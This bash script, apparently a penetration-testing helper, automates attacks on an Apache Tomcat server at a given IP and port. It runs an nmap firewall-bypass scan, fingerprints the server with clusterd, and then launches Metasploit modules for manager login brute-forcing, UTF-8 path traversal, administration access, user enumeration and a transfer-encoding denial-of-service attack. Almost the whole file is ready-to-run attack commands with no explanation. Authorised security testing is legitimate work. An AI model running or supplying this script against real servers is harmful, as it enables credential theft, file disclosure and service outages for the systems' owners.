#!/bin/bash
#if [ $# -ne port ]; then
#	echo "This is tomcat automcation vulnerability testing script"
#	echo "#######################################################"
#	echo "Please use the correct format. Example: ./tomcat_automation ip_add port"
#else 
echo "This is tomcat automcation vulnerability testing script"

while getopts i:p:v: option
do
    case "${option}" in
    	i) ip_addr=${OPTARG};;
		p) port=${OPTARG};;
		v) tomcat_version=${OPTARG};;
	esac
done

if [ -z "$ip_addr" ]; then
	echo "please provide target ip address"
	echo "correct format is $0 -i ip_addr -p port [-v tomcat_version]"
	exit

fi

if [ -z "$port" ]; then
	echo "please provide target port number"
	echo "correct format is $0 -i ip_addr -p port [-v tomcat_version]"
	exit
fi


nmap -A -f $ip_addr -p $port --script firewall-bypass -Pn
curl http://$ip_addr:$port/ -L | grep -Eo "<title>(.*)</title>"
echo "####using clustered scanning tomcat"
cd ~/Public/clusterd
if [ -z "$tomcat_version" ]; then
	python /root/Public/clusterd/clusterd.py -i $ip_addr -p $port --fingerprint -a tomcat -d
else
	python /root/Public/clusterd/clusterd.py -i $ip_addr -p $port -v $tomcat_version --fingerprint -a tomcat -d
fi

echo "####tomcat_mgr_login###"
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS $ip_addr; set RPORT $port; exploit; exit"
echo "####tomcat_utf8_traversal###"
msfconsole -q -x "use auxiliary/admin/http/tomcat_utf8_traversal; set RHOSTS $ip_addr; set RPORT $port; exploit; exit"
echo "####tomcat_administration###"
msfconsole -q -x "use auxiliary/admin/http/tomcat_administration; set RHOSTS $ip_addr; set RPORT $port; exploit; exit"
echo "####apache_tomcat_transfer_encoding###"
msfconsole -q -x "use auxiliary/dos/http/apache_tomcat_transfer_encoding; set RHOST $ip_addr; set RPORT $port; exploit; exit"
echo "####tomcat_enum###"
msfconsole -q -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS $ip_addr; set RPORT $port; exploit; exit"
#fi
